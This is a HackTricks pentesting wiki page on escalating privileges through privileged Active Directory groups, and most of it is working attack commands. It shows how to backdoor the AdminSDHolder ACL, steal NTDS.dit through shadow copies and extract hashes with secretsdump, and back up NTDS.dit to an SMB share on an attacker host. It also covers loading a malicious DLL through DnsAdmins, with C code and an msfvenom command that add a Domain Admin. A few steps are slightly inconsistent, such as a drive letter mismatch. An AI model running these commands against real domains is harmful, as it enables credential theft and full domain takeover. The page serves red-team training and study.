# Privileged Groups

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Well Known groups with administration privileges

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## Account Operators

This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).

To identify the members of this group, the following command is executed:

```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Adding new users is permitted, as well as local login to DC01.

## AdminSDHolder group

The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.

An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.

Commands to review the members and modify permissions include:

```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### Domain Controller Access

Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.

### Privilege Escalation

Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:

```cmd
C:\> .\PsService.exe security AppReadiness
```

This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.

## Backup Operators

Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.

To list group members, execute:

```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Local Attack

To leverage these privileges locally, the following steps are employed:

1. Import necessary libraries:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable and verify `SeBackupPrivilege`:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Access and copy files from restricted directories, for instance:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.

#### Using diskshadow.exe

1. Create a shadow copy of the `C` drive:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copy `NTDS.dit` from the shadow copy:

```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatively, use `robocopy` for file copying:

```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```

3. Extract `SYSTEM` and `SAM` for hash retrieval:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

4. Retrieve all hashes from `NTDS.dit`:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

#### Using wbadmin.exe

1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
    ```cmd
    net use X: \\<AttackIP>\sharename /user:smbuser password
    echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
    wbadmin get versions
    echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
    ```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

To list members of the DnsAdmins group, use:

```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Execute arbitrary DLL

Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:

```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```
```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

For more details on this attack vector, refer to ired.team.

#### Mimilib.dll
It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM
DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.

### Event Log Readers
Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:

```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions
This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.

```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

## Hyper-V Administrators
Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.

### Exploitation Example
Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:

```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```

Note: Hard link exploitation has been mitigated in recent Windows updates.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators
Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:

```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.

#### Remote Desktop Users
This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:

```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users
Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:

```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators
This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:

```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```


## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
